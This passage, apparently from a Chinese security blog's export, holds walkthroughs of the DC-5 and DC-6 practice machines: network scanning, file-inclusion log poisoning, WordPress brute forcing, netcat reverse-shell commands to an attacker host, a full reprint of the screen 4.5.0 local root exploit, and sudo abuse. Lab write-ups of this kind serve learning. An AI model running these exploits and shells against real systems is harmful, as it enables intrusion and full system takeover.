<li>拿<code>flag</code></li>
</ul>
<p><img data-src="./DC-4/12.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>DC</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-5</title>
    <url>/2021/01/17/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/DC-5/</url>
    <content><![CDATA[<h1 id="DC-5"><a href="#DC-5" class="headerlink" title="DC-5"></a>DC-5</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>DC-5</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin/Desktop# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:fa:35:f2, IPv4: 192.168.43.86</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.43.1    f2:7d:f5:4e:0a:93       (Unknown: locally administered)</span><br><span class="line">192.168.43.12   08:00:27:74:ac:bd       PCS Systemtechnik GmbH</span><br><span class="line">192.168.43.25   38:d2:ca:db:01:69       Zhejiang Tmall Technology Co., Ltd.</span><br><span class="line">192.168.43.188  d0:c6:37:be:7e:b3       Intel Corporate</span><br><span class="line"></span><br><span class="line">4 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.945 seconds (131.62 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 192.168.43.25</li>
<li>NMAP</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.43.25</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./DC-5/1.png" alt></p>
<h3 id="web登录"><a href="#web登录" class="headerlink" title="web登录"></a>web登录</h3><p><img data-src="./DC-5/2.png" alt></p>
<p><img data-src="./DC-5/3.png" alt></p>
<p><img data-src="./DC-5/4.png" alt></p>
<ul>
<li>发现文件包含</li>
</ul>
<p><img data-src="./DC-5/5.png" alt></p>
<p><img data-src="./DC-5/6.png" alt></p>
<h3 id="拿shell"><a href="#拿shell" class="headerlink" title="拿shell"></a>拿shell</h3><ul>
<li><p>文件包含 + 包含<code>nginx</code>日志文件 拿<code>shell</code></p>
</li>
<li><p><code>nginx</code>默认日志路径 <code>/var/log/nginx/access.log</code></p>
</li>
</ul>
<p><img data-src="./DC-5/7.png" alt></p>
<p><img data-src="./DC-5/8.png" alt></p>
<ul>
<li>中国蚁剑连接成功</li>
</ul>
<p><img data-src="./DC-5/9.png" alt></p>
<p><img data-src="./DC-5/10.png" alt></p>
<h3 id="反弹shell-amp-提权"><a href="#反弹shell-amp-提权" class="headerlink" title="反弹shell&amp;提权"></a>反弹shell&amp;提权</h3><ul>
<li><code>nc</code>弹<code>shell</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc 192.168.43.86 7777 -c /bin/bash</span><br></pre></td></tr></table></figure>

<ul>
<li><code>kali</code>接收到<code>shell</code></li>
</ul>
<p><img data-src="./DC-5/11.png" alt></p>
<p><img data-src="./DC-5/12.png" alt></p>
<ul>
<li>交互<code>shell</code></li>
</ul>
<p><img data-src="./DC-5/13.png" alt></p>
<ul>
<li>查询<code>suid</code>文件 <code>find / -perm -u=s -type f 2&gt;/dev/null</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">www-data@dc-5:~/html$ find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">/bin/su</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/screen-4.5.0</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/procmail</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/sbin/mount.nfs</span><br></pre></td></tr></table></figure>

<ul>
<li>查找<code>screen-4.5.0</code>本地提权漏洞 <code>https://www.exploit-db.com/exploits/41154</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 41154.sh</span></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> screenroot.sh</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> setuid screen v4.5.0 <span class="built_in">local</span> root exploit</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> abuses ld.so.preload overwriting to get root.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> HACK THE PLANET</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ~ infodox (25/1/2017) </span></span><br><span class="line">echo "~ gnu/screenroot ~"</span><br><span class="line">echo "[+] First, we create our shell and library..."</span><br><span class="line">cat &lt;&lt; EOF &gt; /tmp/libhax.c</span><br><span class="line"><span class="meta">#</span><span class="bash">include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="meta">#</span><span class="bash">include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="meta">#</span><span class="bash">include &lt;unistd.h&gt;</span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line">void dropshell(void)&#123;</span><br><span class="line">    chown("/tmp/rootshell", 0, 0);</span><br><span class="line">    chmod("/tmp/rootshell", 04755);</span><br><span class="line">    unlink("/etc/ld.so.preload");</span><br><span class="line">    printf("[+] done!\n");</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line">rm -f /tmp/libhax.c</span><br><span class="line">cat &lt;&lt; EOF &gt; /tmp/rootshell.c</span><br><span class="line"><span class="meta">#</span><span class="bash">include &lt;stdio.h&gt;</span></span><br><span class="line">int main(void)&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    seteuid(0);</span><br><span class="line">    setegid(0);</span><br><span class="line">    execvp("/bin/sh", NULL, NULL);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -o /tmp/rootshell /tmp/rootshell.c</span><br><span class="line">rm -f /tmp/rootshell.c</span><br><span class="line">echo "[+] Now we create our /etc/ld.so.preload file..."</span><br><span class="line">cd /etc</span><br><span class="line">umask 000 # because</span><br><span class="line">screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed</span><br><span class="line">echo "[+] Triggering..."</span><br><span class="line">screen -ls # screen itself is setuid, so... </span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure>

<p><img data-src="./DC-5/14.png" alt></p>
<ul>
<li>上传二进制到服务器</li>
</ul>
<p><img data-src="./DC-5/15.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /etc</span><br><span class="line">umask 000 </span><br><span class="line">/bin/screen-4.5.0 -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so" </span><br><span class="line">/bin/screen-4.5.0 -ls </span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure>

<ul>
<li>提权成功</li>
</ul>
<p><img data-src="./DC-5/16.png" alt></p>
<ul>
<li>最终<code>flag</code></li>
</ul>
<p><img data-src="./DC-5/17.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>DC</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-6</title>
    <url>/2021/01/23/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/DC-6/</url>
    <content><![CDATA[<h1 id="DC-6"><a href="#DC-6" class="headerlink" title="DC-6"></a>DC-6</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>DC-6</li>
<li>windows10</li>
</ul>
<h3 id="官方提示"><a href="#官方提示" class="headerlink" title="官方提示"></a>官方提示</h3><p><img data-src="./DC-6/1.png" alt></p>
<ul>
<li>需要配置 <code>host</code></li>
<li>密码本 <code>cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt</code></li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:fa:35:f2, IPv4: 192.168.43.86</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.43.1    66:bb:7b:e9:5c:3b       (Unknown: locally administered)</span><br><span class="line">192.168.43.25   38:d2:ca:db:01:69       Zhejiang Tmall Technology Co., Ltd.</span><br><span class="line">192.168.43.128  08:00:27:45:37:d5       PCS Systemtechnik GmbH</span><br><span class="line">192.168.43.188  d0:c6:37:be:7e:b3       Intel Corporate</span><br><span class="line"></span><br><span class="line">4 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.934 seconds (132.37 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 192.168.43.128</li>
<li>NMAP</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.43.128</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# nmap -sV -A -p 1-65535 192.168.43.128</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-23 07:16 EST</span><br><span class="line">Nmap scan report for 192.168.43.128</span><br><span class="line">Host is up (0.00099s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd (RSA)</span><br><span class="line">|   256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA)</span><br><span class="line">|_  256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-title: Did not follow redirect to http://wordy/</span><br><span class="line">|_https-redirect: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">MAC Address: 08:00:27:45:37:D5 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.99 ms 192.168.43.128</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 11.83 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./DC-6/2.png" alt></p>
<p>配置<code>host</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">192.168.43.128 wordy</span><br></pre></td></tr></table></figure>

<p><img data-src="./DC-6/3.png" alt></p>
<p><img data-src="./DC-6/4.png" alt></p>
<p><img data-src="./DC-6/5.png" alt></p>
<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><p><img data-src="./DC-6/6.png" alt></p>
<p>发现是 <code>wordpress</code> 博客框架</p>
<ul>
<li>直接 上一波扫描</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 枚举用户名</span></span><br><span class="line">wpscan --url http://wordy/ --enumerate u</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# wpscan --url http://wordy/ --enumerate u</span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \</span><br><span class="line">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="line">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="line"></span><br><span class="line">         WordPress Security Scanner by the WPScan Team</span><br><span class="line">                         Version 3.8.2</span><br><span class="line">       Sponsored by Automattic - https://automattic.com/</span><br><span class="line">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="line">_______________________________________________________________</span><br><span class="line"></span><br><span class="line">[+] URL: http://wordy/ [192.168.43.128]</span><br><span class="line">[+] Started: Sat Jan 23 07:44:09 2021</span><br><span class="line"></span><br><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] Headers</span><br><span class="line"> | Interesting Entry: Server: Apache/2.4.25 (Debian)</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: http://wordy/xmlrpc.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | References:</span><br><span class="line"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access</span><br><span class="line"></span><br><span class="line">[+] http://wordy/readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: http://wordy/wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 5.1.1 identified (Insecure, released on 2019-03-13).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - http://wordy/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.1.1&lt;/generator&gt;</span><br><span class="line"> |  - http://wordy/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.1.1&lt;/generator&gt;</span><br><span class="line"></span><br><span class="line">[+] WordPress theme in use: twentyseventeen</span><br><span class="line"> | Location: http://wordy/wp-content/themes/twentyseventeen/</span><br><span class="line"> | Last Updated: 2020-12-09T00:00:00.000Z</span><br><span class="line"> | Readme: http://wordy/wp-content/themes/twentyseventeen/README.txt</span><br><span class="line"> | [!] The version is out of date, the latest version is 2.5</span><br><span class="line"> | Style URL: http://wordy/wp-content/themes/twentyseventeen/style.css?ver=5.1.1</span><br><span class="line"> | Style Name: Twenty Seventeen</span><br><span class="line"> | Style URI: https://wordpress.org/themes/twentyseventeen/</span><br><span class="line"> | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...</span><br><span class="line"> | Author: the WordPress team</span><br><span class="line"> | Author URI: https://wordpress.org/</span><br><span class="line"> |</span><br><span class="line"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 2.1 (80% confidence)</span><br><span class="line"> | Found By: Style (Passive Detection)</span><br><span class="line"> |  - http://wordy/wp-content/themes/twentyseventeen/style.css?ver=5.1.1, Match: 'Version: 2.1'</span><br><span class="line"></span><br><span class="line">[+] Enumerating Users (via Passive and Aggressive Methods)</span><br><span class="line"> Brute Forcing Author IDs - Time: 00:00:00 &lt;====================================================================================================================================&gt; (10 / 10) 100.00% Time: 00:00:00</span><br><span class="line"></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] mark</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] graham</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] sarah</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] jens</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.</span><br><span class="line">[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up</span><br><span class="line"></span><br><span class="line">[+] Finished: Sat Jan 23 07:44:12 2021</span><br><span class="line">[+] Requests Done: 59</span><br><span class="line">[+] Cached Requests: 6</span><br><span class="line">[+] Data Sent: 12.536 KB</span><br><span class="line">[+] Data Received: 640.55 KB</span><br><span class="line">[+] Memory used: 142.195 MB</span><br><span class="line">[+] Elapsed time: 00:00:02</span><br></pre></td></tr></table></figure>

<ul>
<li>爆破密码</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpscan --url http://wordy/ --passwords ./passwords.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin/work/dc-6# wpscan --url http://wordy/ --passwords ./passwords.txt</span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \</span><br><span class="line">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="line">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="line"></span><br><span class="line">         WordPress Security Scanner by the WPScan Team</span><br><span class="line">                         Version 3.8.2</span><br><span class="line">       Sponsored by Automattic - https://automattic.com/</span><br><span class="line">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="line">_______________________________________________________________</span><br><span class="line"></span><br><span class="line">[+] URL: http://wordy/ [192.168.43.128]</span><br><span class="line">[+] Started: Sat Jan 23 07:48:47 2021</span><br><span class="line"></span><br><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] Headers</span><br><span class="line"> | Interesting Entry: Server: Apache/2.4.25 (Debian)</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: http://wordy/xmlrpc.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | References:</span><br><span class="line"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access</span><br><span class="line"></span><br><span class="line">[+] http://wordy/readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: http://wordy/wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 5.1.1 identified (Insecure, released on 2019-03-13).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - http://wordy/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.1.1&lt;/generator&gt;</span><br><span class="line"> |  - http://wordy/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.1.1&lt;/generator&gt;</span><br><span class="line"></span><br><span class="line">[+] WordPress theme in use: twentyseventeen</span><br><span class="line"> | Location: http://wordy/wp-content/themes/twentyseventeen/</span><br><span class="line"> | Last Updated: 2020-12-09T00:00:00.000Z</span><br><span class="line"> | Readme: http://wordy/wp-content/themes/twentyseventeen/README.txt</span><br><span class="line"> | [!] The version is out of date, the latest version is 2.5</span><br><span class="line"> | Style URL: http://wordy/wp-content/themes/twentyseventeen/style.css?ver=5.1.1</span><br><span class="line"> | Style Name: Twenty Seventeen</span><br><span class="line"> | Style URI: https://wordpress.org/themes/twentyseventeen/</span><br><span class="line"> | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...</span><br><span class="line"> | Author: the WordPress team</span><br><span class="line"> | Author URI: https://wordpress.org/</span><br><span class="line"> |</span><br><span class="line"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 2.1 (80% confidence)</span><br><span class="line"> | Found By: Style (Passive Detection)</span><br><span class="line"> |  - http://wordy/wp-content/themes/twentyseventeen/style.css?ver=5.1.1, Match: 'Version: 2.1'</span><br><span class="line"></span><br><span class="line">[+] Enumerating All Plugins (via Passive Methods)</span><br><span class="line"></span><br><span class="line">[i] No plugins Found.</span><br><span class="line"></span><br><span class="line">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span><br><span class="line"> Checking Config Backups - Time: 00:00:00 &lt;=====================================================================================================================================&gt; (22 / 22) 100.00% Time: 00:00:00</span><br><span class="line"></span><br><span class="line">[i] No Config Backups Found.</span><br><span class="line"></span><br><span class="line">[+] Enumerating Users (via Passive and Aggressive Methods)</span><br><span class="line"> Brute Forcing Author IDs - Time: 00:00:00 &lt;====================================================================================================================================&gt; (10 / 10) 100.00% Time: 00:00:00</span><br><span class="line"></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] sarah</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] graham</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] mark</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] jens</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] Performing password attack on Xmlrpc against 5 user/s</span><br><span class="line">[SUCCESS] - mark / helpdesk01                                                                                                                                                                                     </span><br><span class="line">Trying graham / !lak019b Time: 00:03:33 &lt;=================================================================================================================================&gt; (12547 / 12547) 100.00% Time: 00:03:33</span><br><span class="line"></span><br><span class="line">[!] Valid Combinations Found:</span><br><span class="line"> | Username: mark, Password: helpdesk01</span><br><span class="line"></span><br><span class="line">[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.</span><br><span class="line">[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up</span><br><span class="line"></span><br><span class="line">[+] Finished: Sat Jan 23 07:52:26 2021</span><br><span class="line">[+] Requests Done: 12588</span><br><span class="line">[+] Cached Requests: 48</span><br><span class="line">[+] Data Sent: 5.88 MB</span><br><span class="line">[+] Data Received: 7.414 MB</span><br><span class="line">[+] Memory used: 253.18 MB</span><br><span class="line">[+] Elapsed time: 00:03:38</span><br></pre></td></tr></table></figure>

<h3 id="登录后台web"><a href="#登录后台web" class="headerlink" title="登录后台web"></a>登录后台web</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mark / helpdesk01</span><br></pre></td></tr></table></figure>

<p><img data-src="./DC-6/7.png" alt></p>
<p>发现 <code>activity monitor</code>插件，尝试复现远程代码执行漏洞</p>
<ul>
<li>复现成功</li>
</ul>
<p><img data-src="./DC-6/8.png" alt></p>
<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.43.86 7777</span><br></pre></td></tr></table></figure>

<p><img data-src="./DC-6/9.png" alt></p>
<p><img data-src="./DC-6/10.png" alt></p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><ul>
<li><p>suid <code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
</li>
<li><p>信息收集一波，发现</p>
</li>
</ul>
<p><img data-src="./DC-6/11.png" alt></p>
<p><img data-src="./DC-6/12.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 发现一个账号</span></span><br><span class="line">graham - GSo7isUM1D4</span><br><span class="line"></span><br><span class="line">ssh graham@192.168.43.128</span><br></pre></td></tr></table></figure>

<p><img data-src="./DC-6/13.png" alt></p>
<p>利用这个切到<code>jens</code>的<code>shell</code>下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo "/bin/bash" &gt;&gt; backups.sh</span><br><span class="line">sudo -u jens ./backups.sh</span><br></pre></td></tr></table></figure>

<p><img data-src="./DC-6/14.png" alt></p>
<ul>
<li>发现突破口，<code>nmap</code>提权</li>
</ul>
<p><img data-src="./DC-6/15.png" alt></p>
